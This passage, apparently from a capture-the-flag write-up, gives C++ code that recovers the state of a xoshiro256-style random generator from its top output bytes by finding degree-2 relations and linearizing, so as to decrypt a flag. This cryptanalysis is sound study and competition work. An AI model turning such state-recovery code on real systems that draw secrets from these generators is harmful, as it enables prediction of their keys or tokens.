class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;vector&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;random&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;m4ri/m4ri.h&gt;</span></span></span><br><span class=\"line\"><span class=\"comment\">// we need to find degree 2 relations that hold certainly</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">uint8_t</span> <span class=\"title\">f</span><span class=\"params\">(<span class=\"type\">uint64_t</span> x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    x *= <span class=\"number\">5</span>;</span><br><span class=\"line\">    x = (x &lt;&lt; <span class=\"number\">7</span>) | (x &gt;&gt; (<span class=\"number\">64</span> - <span class=\"number\">7</span>));</span><br><span class=\"line\">    x *= <span class=\"number\">9</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> x &gt;&gt; <span class=\"number\">56</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">process</span><span class=\"params\">(<span class=\"type\">uint8_t</span> tgt)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    std::mt19937_64 mt;</span><br><span class=\"line\">    <span class=\"type\">size_t</span> n_cols = <span class=\"number\">1</span>;</span><br><span class=\"line\">    n_cols += <span class=\"number\">64</span>;</span><br><span class=\"line\">    n_cols += <span class=\"number\">64</span> * <span class=\"number\">63</span> / <span class=\"number\">2</span>;</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(stderr, <span class=\"string\">&quot;%zu monomials\\n&quot;</span>, n_cols);</span><br><span class=\"line\">    <span class=\"type\">mzd_t</span> *A = <span class=\"built_in\">mzd_init</span>(<span class=\"number\">20000</span>, n_cols);</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> ri = <span class=\"number\">0</span>; ri &lt; A-&gt;nrows; ri++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"type\">uint64_t</span> x = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">do</span></span><br><span class=\"line\">            x = <span class=\"built_in\">mt</span>();</span><br><span class=\"line\">        <span class=\"keyword\">while</span>(<span class=\"built_in\">f</span>(x) != tgt);</span><br><span class=\"line\">        <span class=\"comment\">//printf(&quot;%zu\\n&quot;, x);</span></span><br><span class=\"line\">        <span class=\"type\">size_t</span> mi = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"built_in\">mzd_write_bit</span>(A, ri, mi++, <span class=\"number\">1</span>);</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">64</span>; i++)</span><br><span class=\"line\">            <span class=\"built_in\">mzd_write_bit</span>(A, ri, mi++, (x &gt;&gt; i) &amp; <span class=\"number\">1</span>);</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">64</span>; i++)</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> j = <span class=\"number\">0</span>; j &lt; i; j++)</span><br><span class=\"line\">            <span class=\"built_in\">mzd_write_bit</span>(A, ri, mi++, (x &gt;&gt; i) &amp; (x &gt;&gt; j) &amp; <span class=\"number\">1</span>);</span><br><span class=\"line\">        <span class=\"built_in\">assert</span>(mi == n_cols);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"type\">mzd_t</span>* ker = <span class=\"built_in\">mzd_kernel_left_pluq</span>(A, <span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(stderr, <span class=\"string\">&quot;mat dim: %zu rows, %zu cols\\n&quot;</span>, A-&gt;nrows, A-&gt;ncols);</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(stderr, <span class=\"string\">&quot;ker dim: %zu rows, %zu cols\\n&quot;</span>, ker-&gt;nrows, ker-&gt;ncols);</span><br><span class=\"line\">    <span class=\"type\">mzd_t</span>* tker = <span class=\"built_in\">mzd_transpose</span>(<span class=\"literal\">nullptr</span>, ker);</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(stderr, <span class=\"string\">&quot;tker dim: %zu rows, %zu cols\\n&quot;</span>, tker-&gt;nrows, tker-&gt;ncols);</span><br><span class=\"line\">    <span class=\"built_in\">mzd_free</span>(A);</span><br><span class=\"line\">    <span class=\"built_in\">mzd_free</span>(ker);</span><br><span class=\"line\">    <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">    // check again that the relations are certain (not very fast)</span></span><br><span class=\"line\"><span class=\"comment\">    for(size_t ri = 0; ri &lt; tker-&gt;nrows; ri++)</span></span><br><span class=\"line\"><span class=\"comment\">    &#123;</span></span><br><span class=\"line\"><span class=\"comment\">        for(size_t _ = 0; _ &lt; 100000; _++)</span></span><br><span class=\"line\"><span class=\"comment\">        &#123;</span></span><br><span class=\"line\"><span class=\"comment\">            uint64_t x = 0;</span></span><br><span class=\"line\"><span class=\"comment\">            do</span></span><br><span class=\"line\"><span class=\"comment\">                x = mt();</span></span><br><span class=\"line\"><span class=\"comment\">            while(f(x) != tgt);</span></span><br><span class=\"line\"><span class=\"comment\">            //printf(&quot;%zu\\n&quot;, x);</span></span><br><span class=\"line\"><span class=\"comment\">            size_t nm = 0;</span></span><br><span class=\"line\"><span class=\"comment\">            size_t mi = 0;</span></span><br><span class=\"line\"><span class=\"comment\">            nm ^= mzd_read_bit(tker, ri, mi++);</span></span><br><span class=\"line\"><span class=\"comment\">            for(size_t i = 0; i &lt; 64; i++)</span></span><br><span class=\"line\"><span class=\"comment\">                nm ^= mzd_read_bit(tker, ri, mi++) &amp; (x &gt;&gt; i) &amp; 1;</span></span><br><span class=\"line\"><span class=\"comment\">            for(size_t i = 0; i &lt; 64; i++)</span></span><br><span class=\"line\"><span class=\"comment\">            for(size_t j = 0; j &lt; i; j++)</span></span><br><span class=\"line\"><span class=\"comment\">                nm ^= mzd_read_bit(tker, ri, mi++) &amp; (x &gt;&gt; i) &amp; (x &gt;&gt; j) &amp; 1;</span></span><br><span class=\"line\"><span class=\"comment\">            //assert(mi == n_cols);</span></span><br><span class=\"line\"><span class=\"comment\">            assert(nm == 0);</span></span><br><span class=\"line\"><span class=\"comment\">        &#125;</span></span><br><span class=\"line\"><span class=\"comment\">    &#125;</span></span><br><span class=\"line\"><span class=\"comment\">    */</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> ri = <span class=\"number\">0</span>; ri &lt; tker-&gt;nrows; ri++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d &quot;</span>, (<span class=\"type\">int</span>)tgt);</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> ci = <span class=\"number\">0</span>; ci &lt; tker-&gt;ncols; ci++)</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d&quot;</span>, (<span class=\"type\">int</span>)<span class=\"built_in\">mzd_read_bit</span>(tker, ri, ci));</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">mzd_free</span>(tker);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">256</span>; i++)</span><br><span class=\"line\">        <span class=\"built_in\">process</span>(i);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>hax.cpp</code> 如下：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;array&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;vector&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;random&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;bitset&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;m4ri/m4ri.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">uint8_t</span> <span class=\"title\">func</span><span class=\"params\">(<span class=\"type\">uint64_t</span> x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    x *= <span class=\"number\">5</span>;</span><br><span class=\"line\">    x = (x &lt;&lt; <span class=\"number\">7</span>) | (x &gt;&gt; (<span class=\"number\">64</span> - <span class=\"number\">7</span>));</span><br><span class=\"line\">    x *= <span class=\"number\">9</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> x &gt;&gt; <span class=\"number\">56</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">constexpr</span> <span class=\"type\">size_t</span> N_MONO = <span class=\"number\">1</span> + <span class=\"number\">256</span> + <span class=\"number\">256</span> * <span class=\"number\">255</span> / <span class=\"number\">2</span>;</span><br><span class=\"line\"><span class=\"keyword\">using</span> deg2_rel = std::bitset&lt;<span class=\"number\">1</span> + <span class=\"number\">256</span> + <span class=\"number\">256</span> * <span class=\"number\">255</span> / <span class=\"number\">2</span>&gt;;</span><br><span class=\"line\"><span class=\"keyword\">using</span> deg2_rel64 = std::bitset&lt;<span class=\"number\">1</span> + <span class=\"number\">64</span> + <span class=\"number\">64</span> * <span class=\"number\">63</span> / <span class=\"number\">2</span>&gt;;</span><br><span class=\"line\"><span class=\"keyword\">using</span> lin_rel = std::bitset&lt;<span class=\"number\">256</span>&gt;;</span><br><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">sym_u64</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    lin_rel st[<span class=\"number\">64</span>] &#123;&#125;;</span><br><span class=\"line\">    sym_u64&amp; <span class=\"keyword\">operator</span>^=(<span class=\"type\">const</span> sym_u64&amp; rhs)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">64</span>; i++)</span><br><span class=\"line\">            st[i] ^= rhs.st[i];</span><br><span class=\"line\">        <span class=\"keyword\">return</span> *<span class=\"keyword\">this</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    sym_u64 <span class=\"keyword\">operator</span>^(<span class=\"type\">const</span> sym_u64&amp; rhs) <span class=\"type\">const</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        sym_u64 ret = *<span class=\"keyword\">this</span>;</span><br><span class=\"line\">        ret ^= rhs;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    sym_u64 <span class=\"keyword\">operator</span>&lt;&lt;(<span class=\"type\">int</span> by) <span class=\"type\">const</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        sym_u64 ret &#123;&#125;;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">64</span> - by; i++)</span><br><span class=\"line\">            ret.st[i + by] = st[i];</span><br><span class=\"line\">        <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    sym_u64 <span class=\"keyword\">operator</span>&gt;&gt;(<span class=\"type\">int</span> by) <span class=\"type\">const</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        sym_u64 ret &#123;&#125;;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">64</span> - by; i++)</span><br><span class=\"line\">            ret.st[i] = st[i + by];</span><br><span class=\"line\">        <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\">sym_u64 <span class=\"title\">rotl</span><span class=\"params\">(<span class=\"type\">int</span> by)</span> <span class=\"type\">const</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        sym_u64 ret &#123;&#125;;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">64</span>; i++)</span><br><span class=\"line\">            ret.st[(i + by)%<span class=\"number\">64</span>] = st[i];</span><br><span class=\"line\">        <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">sym_xs256</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    sym_u64 s0, s1, s2, s3;</span><br><span class=\"line\">    <span class=\"built_in\">sym_xs256</span>()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">64</span>; i++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            s0.st[i][i] = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            s1.st[i][i+<span class=\"number\">64</span>] = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            s2.st[i][i+<span class=\"number\">128</span>] = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            s3.st[i][i+<span class=\"number\">192</span>] = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\">sym_u64 <span class=\"title\">step</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        sym_u64 res_s1 = s1;</span><br><span class=\"line\">        sym_u64 t = s1 &lt;&lt; <span class=\"number\">17</span>;</span><br><span class=\"line\">        s2 ^= s0;</span><br><span class=\"line\">        s3 ^= s1;</span><br><span class=\"line\">        s1 ^= s2;</span><br><span class=\"line\">        s0 ^= s3;</span><br><span class=\"line\">        s2 ^= t;</span><br><span class=\"line\">        s3 = s3.<span class=\"built_in\">rotl</span>(<span class=\"number\">45</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> res_s1;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">std::array&lt;std::vector&lt;deg2_rel64&gt;, 256&gt; krels;</span><br><span class=\"line\"><span class=\"function\">deg2_rel <span class=\"title\">to_deg2</span><span class=\"params\">(lin_rel lhs)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    deg2_rel ret &#123;&#125;;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">256</span>; i++)</span><br><span class=\"line\">        ret[i+<span class=\"number\">1</span>] = lhs[i]; <span class=\"comment\">// 0 is the constant term</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\">deg2_rel <span class=\"title\">mul</span><span class=\"params\">(lin_rel lhs, lin_rel rhs)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    deg2_rel ret &#123;&#125;; <span class=\"comment\">// compute the product coefficients directly</span></span><br><span class=\"line\">    <span class=\"type\">size_t</span> mi = <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">256</span>; i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        ret[mi] = ret[mi] ^ (lhs[i] &amp; rhs[i]);</span><br><span class=\"line\">        mi++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">256</span>; i++)</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> j = <span class=\"number\">0</span>; j &lt; i; j++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        ret[mi] = ret[mi] ^ (lhs[i] &amp; rhs[j]);</span><br><span class=\"line\">        ret[mi] = ret[mi] ^ (lhs[j] &amp; rhs[i]);</span><br><span class=\"line\">        mi++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    FILE* f = <span class=\"built_in\">fopen</span>(<span class=\"string\">&quot;list_rels&quot;</span>, <span class=\"string\">&quot;r&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(<span class=\"literal\">true</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"type\">char</span> buf[<span class=\"number\">4096</span>];</span><br><span class=\"line\">        <span class=\"type\">int</span> res = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"type\">int</span> ok = <span class=\"built_in\">fscanf</span>(f, <span class=\"string\">&quot;%d%s&quot;</span>, &amp;res, buf);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(ok &lt; <span class=\"number\">2</span>)</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        deg2_rel64 rel &#123;&#125;;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> i = <span class=\"number\">0</span>; i &lt; rel.<span class=\"built_in\">size</span>(); i++)</span><br><span class=\"line\">            rel[i] = buf[i] - <span class=\"string\">&#x27;0&#x27;</span>;</span><br><span class=\"line\">        krels[res].<span class=\"built_in\">push_back</span>(std::<span class=\"built_in\">move</span>(rel));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">fclose</span>(f);</span><br><span class=\"line\">    sym_xs256 rng &#123;&#125;;</span><br><span class=\"line\">    <span class=\"comment\">// we&#x27;re targeting the state before the flag is encrypted so skip some bytes now</span></span><br><span class=\"line\">    f = <span class=\"built_in\">fopen</span>(<span class=\"string\">&quot;out_bin&quot;</span>, <span class=\"string\">&quot;rb&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">constexpr</span> <span class=\"type\">int</span> FLAG_LEN = <span class=\"number\">41</span>;</span><br><span class=\"line\">    <span class=\"type\">uint8_t</span> encflag[FLAG_LEN];</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">41</span>; i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        encflag[i] = <span class=\"built_in\">fgetc</span>(f);</span><br><span class=\"line\">        rng.<span class=\"built_in\">step</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    std::vector&lt;deg2_rel&gt; all_rels;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">2000</span>; i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">fprintf</span>(stderr, <span class=\"string\">&quot;i=%d\\n&quot;</span>, i);</span><br><span class=\"line\">        <span class=\"type\">uint8_t</span> outb = <span class=\"built_in\">fgetc</span>(f);</span><br><span class=\"line\">        sym_u64 s1 = rng.<span class=\"built_in\">step</span>();</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"type\">const</span> deg2_rel64&amp; big_rel : krels[outb])</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            deg2_rel res &#123;&#125;;</span><br><span class=\"line\">            <span class=\"type\">size_t</span> mi = <span class=\"number\">1</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(big_rel[<span class=\"number\">0</span>])</span><br><span class=\"line\">                res[<span class=\"number\">0</span>] = res[<span class=\"number\">0</span>] ^ <span class=\"number\">1</span>;</span><br><span class=\"line\">            <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">64</span>; i++)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(big_rel[mi])</span><br><span class=\"line\">                    res ^= <span class=\"built_in\">to_deg2</span>(s1.st[i]);</span><br><span class=\"line\">                mi++;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">64</span>; i++)</span><br><span class=\"line\">            <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> j = <span class=\"number\">0</span>; j &lt; i; j++)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(big_rel[mi])</span><br><span class=\"line\">                    res ^= <span class=\"built_in\">mul</span>(s1.st[i], s1.st[j]);</span><br><span class=\"line\">                mi++;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            all_rels.<span class=\"built_in\">push_back</span>(res);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">fclose</span>(f);</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(stderr, <span class=\"string\">&quot;%zu\\n&quot;</span>, all_rels.<span class=\"built_in\">size</span>());</span><br><span class=\"line\">    <span class=\"type\">mzd_t</span> *A = <span class=\"built_in\">mzd_init</span>(all_rels.<span class=\"built_in\">size</span>(), N_MONO);</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> i = <span class=\"number\">0</span>; i &lt; all_rels.<span class=\"built_in\">size</span>(); i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"type\">size_t</span> j = <span class=\"number\">0</span>; j &lt; N_MONO; j++)</span><br><span class=\"line\">            <span class=\"built_in\">mzd_write_bit</span>(A, i, j, all_rels[i][j]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// we solve this system by linearization</span></span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(stderr, <span class=\"string\">&quot;starting solve\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(stderr, <span class=\"string\">&quot;mat dim: %zu rows, %zu cols\\n&quot;</span>, A-&gt;nrows, A-&gt;ncols);</span><br><span class=\"line\">    <span class=\"type\">mzd_t</span>* ker = <span class=\"built_in\">mzd_kernel_left_pluq</span>(A, <span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"type\">mzd_t</span>* tker = <span class=\"built_in\">mzd_transpose</span>(<span class=\"literal\">nullptr</span>, ker);</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(stderr, <span class=\"string\">&quot;tker dim: %zu rows, %zu cols\\n&quot;</span>, tker-&gt;nrows, tker-&gt;ncols);</span><br><span class=\"line\">    <span class=\"built_in\">mzd_free</span>(A);</span><br><span class=\"line\">    <span class=\"built_in\">mzd_free</span>(ker);</span><br><span class=\"line\">    <span class=\"built_in\">assert</span>(tker-&gt;nrows == <span class=\"number\">1</span>); <span class=\"comment\">// only 1 solution</span></span><br><span class=\"line\">    sym_xs256 rng2 